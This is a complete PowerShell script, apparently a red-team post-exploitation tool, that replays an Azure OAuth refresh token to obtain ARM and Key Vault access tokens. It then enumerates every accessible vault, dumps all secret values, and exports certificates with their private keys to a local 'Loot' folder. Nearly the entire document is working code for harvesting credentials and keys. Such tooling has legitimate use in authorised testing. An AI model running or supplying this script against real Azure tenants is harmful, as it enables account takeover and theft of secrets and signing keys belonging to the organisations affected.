###############################################################
# Script Name: Invoke-KeyVaultRecon.ps1
#
# Description:
# All-in-one Azure Key Vault reconnaissance tool.
#
# This script performs the following steps:
#
#   1. Exchanges an OAuth refresh token for both an ARM access
#      token (management.azure.com) and a Key Vault access token
#      (vault.azure.net) using the OAuth refresh token grant.
#
#   2. Authenticates the Az PowerShell context using
#      Connect-AzAccount with the retrieved tokens.
#
#   3. Enumerates all accessible Key Vaults in the active
#      subscription (or a specific vault if -VaultName is given).
#
#   4. Checks RBAC permissions on each vault via the ARM REST
#      API, displaying Actions, NotActions, DataActions, and
#      NotDataActions.
#
#   5. Enumerates and retrieves all secret values from each
#      vault via the Key Vault REST API.
#
#   6. Enumerates certificates from each vault, exports each
#      as both a PFX file (includes private key when stored in
#      Key Vault) and a PEM file (public certificate).
#
#   All results are displayed to the screen and saved to disk
#   under the -OutputPath directory.
#
# Requirements:
# - Az PowerShell module (Install-Module Az)
# - Valid Azure AD OAuth refresh token
# - Azure AD Application (Client) ID
# - Appropriate Key Vault permissions (Key Vault Secrets User
#   or higher for secrets and certificate private key export)
#
# Usage:
#   .\Invoke-KeyVaultRecon.ps1 `
#     -RefreshToken "<token>" `
#     -ClientID "<client-id>" `
#     -TenantID "<tenant-id>" `
#     -AccountId "user@domain.com"
#
#   # Target a specific vault:
#   .\Invoke-KeyVaultRecon.ps1 ... -VaultName "myVault"
#
#   # Custom output path:
#   .\Invoke-KeyVaultRecon.ps1 ... -OutputPath "C:\Loot\KV"
###############################################################

[CmdletBinding()]
param (
    # OAuth refresh token previously obtained during authentication
    [Parameter(Mandatory = $true)]
    [string]$RefreshToken,

    # Azure AD Application (Client) ID
    [Parameter(Mandatory = $true)]
    [string]$ClientID,

    # Azure AD Tenant ID
    [Parameter(Mandatory = $true)]
    [string]$TenantID,

    # UPN / account identifier used with Connect-AzAccount
    [Parameter(Mandatory = $true)]
    [string]$AccountId,

    # Optional: restrict enumeration to a single named vault
    [Parameter(Mandatory = $false)]
    [string]$VaultName,

    # Directory where output files are written
    [Parameter(Mandatory = $false)]
    [string]$OutputPath = ".\KVReconOutput",

    # Key Vault REST API version
    [Parameter(Mandatory = $false)]
    [string]$KVApiVersion = "7.4"
)


###############################################################
# HELPER FUNCTIONS
###############################################################

function Write-Banner {
    param([string]$Title)
    $Line = "#" * 63
    Write-Host ""
    Write-Host $Line -ForegroundColor Cyan
    Write-Host "# $Title" -ForegroundColor Cyan
    Write-Host $Line -ForegroundColor Cyan
}

# Splits a base64 string into 64-character lines for PEM output
function ConvertTo-PemLines {
    param([string]$Base64)
    $Lines = for ($i = 0; $i -lt $Base64.Length; $i += 64) {
        $Base64.Substring($i, [Math]::Min(64, $Base64.Length - $i))
    }
    return $Lines
}

# Retrieves all pages of a Key Vault list endpoint (handles nextLink pagination)
function Invoke-KVPagedRequest {
    param(
        [string]$Uri,
        [string]$Token
    )
    $AllItems = [System.Collections.Generic.List[object]]::new()
    $NextUri  = $Uri

    while ($NextUri) {
        $Response = Invoke-RestMethod `
            -Method  GET `
            -Uri     $NextUri `
            -Headers @{ Authorization = "Bearer $Token" }

        if ($Response.value) {
            $AllItems.AddRange([object[]]$Response.value)
        }
        $NextUri = if ($Response.nextLink) { $Response.nextLink } else { $null }
    }
    return $AllItems
}


###############################################################
# SETUP — OUTPUT DIRECTORY
###############################################################

if (-not (Test-Path $OutputPath)) {
    New-Item -ItemType Directory -Path $OutputPath | Out-Null
    Write-Host "[+] Created output directory: $(Resolve-Path $OutputPath)" -ForegroundColor Green
}
else {
    Write-Host "[*] Output directory: $(Resolve-Path $OutputPath)" -ForegroundColor Yellow
}


###############################################################
# PHASE 1 — TOKEN ACQUISITION
###############################################################

Write-Banner "PHASE 1 — TOKEN ACQUISITION"

$TokenEndpoint = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"

# --- ARM Token ---
Write-Host "`n[*] Requesting ARM access token (management.azure.com)..." -ForegroundColor Yellow

$ARMBody = @{
    client_id     = $ClientID
    scope         = "https://management.azure.com/.default"
    refresh_token = $RefreshToken
    grant_type    = "refresh_token"
}

try {
    $ARMResponse    = Invoke-RestMethod `
        -Method      POST `
        -Uri         $TokenEndpoint `
        -ContentType "application/x-www-form-urlencoded" `
        -Body        $ARMBody
    $ARMAccessToken = $ARMResponse.access_token
    Write-Host "[+] ARM token acquired. Preview: $($ARMAccessToken.Substring(0, [Math]::Min(50, $ARMAccessToken.Length)))..." -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to acquire ARM token: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# --- Key Vault Token ---
Write-Host "`n[*] Requesting Key Vault access token (vault.azure.net)..." -ForegroundColor Yellow

$KVBody = @{
    client_id     = $ClientID
    scope         = "https://vault.azure.net/.default"
    refresh_token = $RefreshToken
    grant_type    = "refresh_token"
}

try {
    $KVResponse          = Invoke-RestMethod `
        -Method      POST `
        -Uri         $TokenEndpoint `
        -ContentType "application/x-www-form-urlencoded" `
        -Body        $KVBody
    $KeyVaultAccessToken = $KVResponse.access_token
    Write-Host "[+] Key Vault token acquired. Preview: $($KeyVaultAccessToken.Substring(0, [Math]::Min(50, $KeyVaultAccessToken.Length)))..." -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to acquire Key Vault token: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}


###############################################################
# PHASE 2 — AUTHENTICATE AZ POWERSHELL CONTEXT
###############################################################

Write-Banner "PHASE 2 — AUTHENTICATE AZ POWERSHELL CONTEXT"

Write-Host "`n[*] Connecting to Azure with provided tokens..." -ForegroundColor Yellow

try {
    Connect-AzAccount `
        -AccessToken          $ARMAccessToken `
        -KeyVaultAccessToken  $KeyVaultAccessToken `
        -AccountId            $AccountId `
        -Tenant               $TenantID | Out-Null

    $Context = Get-AzContext
    Write-Host "[+] Connected successfully." -ForegroundColor Green
    Write-Host "    Account      : $($Context.Account.Id)"
    Write-Host "    Tenant       : $($Context.Tenant.Id)"
    Write-Host "    Subscription : $($Context.Subscription.Name) ($($Context.Subscription.Id))"
}
catch {
    Write-Host "[-] Failed to connect to Azure: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

$SubscriptionID = $Context.Subscription.Id


###############################################################
# PHASE 3 — VAULT ENUMERATION
###############################################################

Write-Banner "PHASE 3 — VAULT ENUMERATION"

Write-Host "`n[*] Enumerating Key Vaults..." -ForegroundColor Yellow

try {
    $KeyVaults = if ($VaultName) {
        @(Get-AzKeyVault -VaultName $VaultName)
    }
    else {
        @(Get-AzKeyVault)
    }

    if (-not $KeyVaults -or $KeyVaults.Count -eq 0) {
        Write-Host "[-] No Key Vaults found." -ForegroundColor Red
        exit 0
    }

    Write-Host "[+] Found $($KeyVaults.Count) vault(s):`n" -ForegroundColor Green

    foreach ($Vault in $KeyVaults) {
        Write-Host "    Vault Name       : $($Vault.VaultName)" -ForegroundColor White
        Write-Host "    Resource Group   : $($Vault.ResourceGroupName)"
        Write-Host "    Location         : $($Vault.Location)"
        Write-Host "    Vault URI        : https://$($Vault.VaultName).vault.azure.net"
        Write-Host "    Soft Delete      : $($Vault.EnableSoftDelete)"
        Write-Host "    Purge Protection : $($Vault.EnablePurgeProtection)"
        Write-Host ""
    }
}
catch {
    Write-Host "[-] Failed to enumerate Key Vaults: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}


###############################################################
# PHASE 4-6 — PER-VAULT OPERATIONS
###############################################################

foreach ($Vault in $KeyVaults) {

    $CurrentVaultName = $Vault.VaultName
    $VaultBaseUri     = "https://$CurrentVaultName.vault.azure.net"
    $ResourceGroup    = $Vault.ResourceGroupName

    Write-Host ""
    Write-Host ("=" * 63) -ForegroundColor Magenta
    Write-Host "  VAULT: $CurrentVaultName" -ForegroundColor Magenta
    Write-Host ("=" * 63) -ForegroundColor Magenta


    ###########################################################
    # PHASE 4 — RBAC PERMISSION CHECK
    ###########################################################

    Write-Banner "PHASE 4 — RBAC PERMISSIONS: $CurrentVaultName"

    $PermissionsURI = "https://management.azure.com/subscriptions/$SubscriptionID" +
                      "/resourceGroups/$ResourceGroup/providers/Microsoft.KeyVault" +
                      "/vaults/$CurrentVaultName/providers/Microsoft.Authorization" +
                      "/permissions?api-version=2022-04-01"

    try {
        $Permissions = (Invoke-RestMethod `
            -Method  GET `
            -Uri     $PermissionsURI `
            -Headers @{ Authorization = "Bearer $ARMAccessToken" }).value

        if ($Permissions) {
            foreach ($Perm in $Permissions) {
                Write-Host "`n    Actions        :" -ForegroundColor White
                $Perm.actions        | ForEach-Object { Write-Host "      - $_" }
                Write-Host "    NotActions     :"
                $Perm.notActions     | ForEach-Object { Write-Host "      - $_" }
                Write-Host "    DataActions    :" -ForegroundColor Green
                $Perm.dataActions    | ForEach-Object { Write-Host "      - $_" -ForegroundColor Green }
                Write-Host "    NotDataActions :"
                $Perm.notDataActions | ForEach-Object { Write-Host "      - $_" }
            }
        }
        else {
            Write-Host "[!] No RBAC permissions returned for $CurrentVaultName" -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "[-] Failed to retrieve RBAC permissions for ${CurrentVaultName}: $($_.Exception.Message)" -ForegroundColor Red
    }


    ###########################################################
    # PHASE 5 — SECRET ENUMERATION AND RETRIEVAL
    ###########################################################

    Write-Banner "PHASE 5 — SECRETS: $CurrentVaultName"

    $SecretsOutputFile = Join-Path $OutputPath "$CurrentVaultName-secrets.txt"
    $SecretsOutput     = [System.Collections.Generic.List[string]]::new()
    $SecretsOutput.Add("# Key Vault : $CurrentVaultName")
    $SecretsOutput.Add("# Retrieved : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
    $SecretsOutput.Add("")

    try {
        $SecretItems = Invoke-KVPagedRequest `
            -Uri   "$VaultBaseUri/secrets?api-version=$KVApiVersion" `
            -Token $KeyVaultAccessToken

        if (-not $SecretItems -or $SecretItems.Count -eq 0) {
            Write-Host "[!] No secrets found in $CurrentVaultName" -ForegroundColor Yellow
        }
        else {
            Write-Host "[+] Found $($SecretItems.Count) secret(s) in $CurrentVaultName`n" -ForegroundColor Green

            foreach ($SecretItem in $SecretItems) {
                # Secret name is the last segment of the ID URL
                $SecretName = $SecretItem.id.Split("/")[-1]

                try {
                    $SecretResponse = Invoke-RestMethod `
                        -Method  GET `
                        -Uri     "$VaultBaseUri/secrets/$SecretName`?api-version=$KVApiVersion" `
                        -Headers @{ Authorization = "Bearer $KeyVaultAccessToken" }

                    $SecretValue = $SecretResponse.value
                    $SecretEnabled = $SecretResponse.attributes.enabled
                    $SecretExpiry  = if ($SecretResponse.attributes.exp) {
                        [DateTimeOffset]::FromUnixTimeSeconds($SecretResponse.attributes.exp).ToString("yyyy-MM-dd")
                    } else { "No expiry" }
                    $ContentType   = if ($SecretResponse.contentType) { $SecretResponse.contentType } else { "N/A" }

                    Write-Host "    Secret Name  : $SecretName" -ForegroundColor White
                    Write-Host "    Value        : $SecretValue" -ForegroundColor Yellow
                    Write-Host "    Enabled      : $SecretEnabled"
                    Write-Host "    Expires      : $SecretExpiry"
                    Write-Host "    Content Type : $ContentType"
                    Write-Host ""

                    $SecretsOutput.Add("Secret Name  : $SecretName")
                    $SecretsOutput.Add("Value        : $SecretValue")
                    $SecretsOutput.Add("Enabled      : $SecretEnabled")
                    $SecretsOutput.Add("Expires      : $SecretExpiry")
                    $SecretsOutput.Add("Content Type : $ContentType")
                    $SecretsOutput.Add("")
                }
                catch {
                    Write-Host "    [-] Could not retrieve value for secret '${SecretName}': $($_.Exception.Message)" -ForegroundColor Red
                    $SecretsOutput.Add("Secret Name  : $SecretName")
                    $SecretsOutput.Add("Value        : [RETRIEVAL FAILED - $($_.Exception.Message)]")
                    $SecretsOutput.Add("")
                }
            }

            $SecretsOutput | Out-File -FilePath $SecretsOutputFile -Encoding UTF8
            Write-Host "[+] Secrets saved to: $SecretsOutputFile" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "[-] Failed to enumerate secrets for ${CurrentVaultName}: $($_.Exception.Message)" -ForegroundColor Red
    }


    ###########################################################
    # PHASE 6 — CERTIFICATE ENUMERATION AND EXPORT
    ###########################################################

    Write-Banner "PHASE 6 — CERTIFICATES: $CurrentVaultName"

    try {
        $CertItems = Invoke-KVPagedRequest `
            -Uri   "$VaultBaseUri/certificates?api-version=$KVApiVersion" `
            -Token $KeyVaultAccessToken

        if (-not $CertItems -or $CertItems.Count -eq 0) {
            Write-Host "[!] No certificates found in $CurrentVaultName" -ForegroundColor Yellow
        }
        else {
            Write-Host "[+] Found $($CertItems.Count) certificate(s) in $CurrentVaultName`n" -ForegroundColor Green

            foreach ($CertItem in $CertItems) {
                $CertName = $CertItem.id.Split("/")[-1]

                try {
                    # Get certificate metadata: thumbprint, expiry, content type
                    $CertMeta    = Invoke-RestMethod `
                        -Method  GET `
                        -Uri     "$VaultBaseUri/certificates/$CertName`?api-version=$KVApiVersion" `
                        -Headers @{ Authorization = "Bearer $KeyVaultAccessToken" }

                    $Thumbprint  = $CertMeta.x5t
                    $CertEnabled = $CertMeta.attributes.enabled
                    $NotBefore   = if ($CertMeta.attributes.nbf) {
                        [DateTimeOffset]::FromUnixTimeSeconds($CertMeta.attributes.nbf).ToString("yyyy-MM-dd")
                    } else { "N/A" }
                    $Expiry      = if ($CertMeta.attributes.exp) {
                        [DateTimeOffset]::FromUnixTimeSeconds($CertMeta.attributes.exp).ToString("yyyy-MM-dd")
                    } else { "No expiry" }
                    $ContentType = $CertMeta.policy.secretProperties.contentType

                    Write-Host "    Certificate  : $CertName" -ForegroundColor White
                    Write-Host "    Thumbprint   : $Thumbprint"
                    Write-Host "    Enabled      : $CertEnabled"
                    Write-Host "    Valid From   : $NotBefore"
                    Write-Host "    Expires      : $Expiry"
                    Write-Host "    Content Type : $ContentType"

                    ###################################################
                    # Export via the secrets endpoint.
                    # Key Vault stores the cert + private key bundle as
                    # a secret at the same name. Retrieving it returns
                    # a base64-encoded PFX (application/x-pkcs12) or
                    # PEM bundle (application/x-pem-file).
                    # Requires Key Vault Secrets User permission.
                    ###################################################

                    try {
                        $CertSecretResp = Invoke-RestMethod `
                            -Method  GET `
                            -Uri     "$VaultBaseUri/secrets/$CertName`?api-version=$KVApiVersion" `
                            -Headers @{ Authorization = "Bearer $KeyVaultAccessToken" }

                        $BundleBase64 = $CertSecretResp.value

                        if ($ContentType -eq "application/x-pkcs12" -or [string]::IsNullOrEmpty($ContentType)) {

                            # ---- PFX Export ----------------------------------------
                            $PfxPath  = Join-Path $OutputPath "$CurrentVaultName-$CertName-export.pfx"
                            $PfxBytes = [System.Convert]::FromBase64String($BundleBase64)
                            [System.IO.File]::WriteAllBytes($PfxPath, $PfxBytes)
                            Write-Host "    [+] PFX saved    : $PfxPath" -ForegroundColor Green

                            # ---- PEM Export (public cert extracted from PFX) --------
                            try {
                                $X509      = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new(
                                    $PfxBytes, "",
                                    [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable
                                )
                                $PemLines   = ConvertTo-PemLines -Base64 ([System.Convert]::ToBase64String($X509.RawData))
                                $PemContent = "-----BEGIN CERTIFICATE-----`n" +
                                              ($PemLines -join "`n") +
                                              "`n-----END CERTIFICATE-----"
                                $PemPath    = Join-Path $OutputPath "$CurrentVaultName-$CertName.pem"
                                [System.IO.File]::WriteAllText($PemPath, $PemContent, [System.Text.Encoding]::ASCII)
                                Write-Host "    [+] PEM saved    : $PemPath" -ForegroundColor Green
                            }
                            catch {
                                Write-Host "    [-] PEM extraction from PFX failed: $($_.Exception.Message)" -ForegroundColor Red
                            }
                        }
                        elseif ($ContentType -eq "application/x-pem-file") {

                            # ---- PEM Export (already PEM-encoded bundle) ------------
                            $PemPath = Join-Path $OutputPath "$CurrentVaultName-$CertName.pem"
                            [System.IO.File]::WriteAllText($PemPath, $BundleBase64, [System.Text.Encoding]::ASCII)
                            Write-Host "    [+] PEM saved    : $PemPath" -ForegroundColor Green

                            # ---- PFX Export (derive from PEM public cert) -----------
                            try {
                                $PemBytes = [System.Text.Encoding]::ASCII.GetBytes($BundleBase64)
                                $X509     = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new($PemBytes)
                                $PfxBytes = $X509.Export(
                                    [System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx
                                )
                                $PfxPath  = Join-Path $OutputPath "$CurrentVaultName-$CertName-export.pfx"
                                [System.IO.File]::WriteAllBytes($PfxPath, $PfxBytes)
                                Write-Host "    [+] PFX saved    : $PfxPath" -ForegroundColor Green
                            }
                            catch {
                                Write-Host "    [-] PFX conversion from PEM failed: $($_.Exception.Message)" -ForegroundColor Red
                            }
                        }
                        else {
                            # Unknown content type — save raw base64 for manual inspection
                            Write-Host "    [!] Unrecognised content type '$ContentType' — saving raw base64." -ForegroundColor Yellow
                            $RawPath = Join-Path $OutputPath "$CurrentVaultName-$CertName-raw.b64"
                            [System.IO.File]::WriteAllText($RawPath, $BundleBase64, [System.Text.Encoding]::ASCII)
                            Write-Host "    [+] Raw saved    : $RawPath" -ForegroundColor Green
                        }
                    }
                    catch {
                        # Secret endpoint access denied — fall back to public cert only
                        Write-Host "    [-] Private key export failed (secrets endpoint): $($_.Exception.Message)" -ForegroundColor Red

                        if ($CertMeta.cer) {
                            try {
                                $CerBytes   = [System.Convert]::FromBase64String($CertMeta.cer)
                                $X509       = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new($CerBytes)
                                $PemLines   = ConvertTo-PemLines -Base64 ([System.Convert]::ToBase64String($X509.RawData))
                                $PemContent = "-----BEGIN CERTIFICATE-----`n" +
                                              ($PemLines -join "`n") +
                                              "`n-----END CERTIFICATE-----"
                                $PemPath    = Join-Path $OutputPath "$CurrentVaultName-$CertName-public-only.pem"
                                [System.IO.File]::WriteAllText($PemPath, $PemContent, [System.Text.Encoding]::ASCII)
                                Write-Host "    [+] Public cert  : $PemPath (no private key)" -ForegroundColor Yellow
                            }
                            catch {
                                Write-Host "    [-] Public cert fallback also failed: $($_.Exception.Message)" -ForegroundColor Red
                            }
                        }
                    }

                    Write-Host ""
                }
                catch {
                    Write-Host "    [-] Failed to retrieve certificate '${CertName}': $($_.Exception.Message)" -ForegroundColor Red
                }
            }
        }
    }
    catch {
        Write-Host "[-] Failed to enumerate certificates for ${CurrentVaultName}: $($_.Exception.Message)" -ForegroundColor Red
    }

} # end foreach vault


###############################################################
# COMPLETE
###############################################################

Write-Host ""
Write-Host ("#" * 63) -ForegroundColor Cyan
Write-Host "# RECON COMPLETE" -ForegroundColor Cyan
Write-Host "# Output directory: $(Resolve-Path $OutputPath)" -ForegroundColor Cyan
Write-Host ("#" * 63) -ForegroundColor Cyan
Write-Host ""
